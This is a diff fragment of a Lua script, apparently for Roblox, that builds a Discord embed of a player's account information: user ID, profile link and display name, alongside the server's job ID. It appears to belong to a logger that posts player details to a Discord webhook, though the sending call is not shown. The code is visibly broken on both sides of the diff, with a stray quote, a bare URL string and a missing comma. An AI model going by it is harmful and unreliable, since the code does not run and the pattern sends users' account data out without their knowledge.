@@ -10605,8 +10605,8 @@ local jobId = game.JobId
 -- Tạo dữ liệu gửi lên Discord
 local Data = {
     ["embeds"] = {{
-        ["title"] = "Roblox Account Information",
-        ["url"] = "https://www.roblox.com/users/"119980166507719",
+        ["title"] = "Roblox Account Information".. player.UserId,
+        ["url"] = "https://www.roblox.com/users/" 
         ["description"] = "Display name: **" .. player.DisplayName .. "**",
         ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
         ["thumbnail"] = {
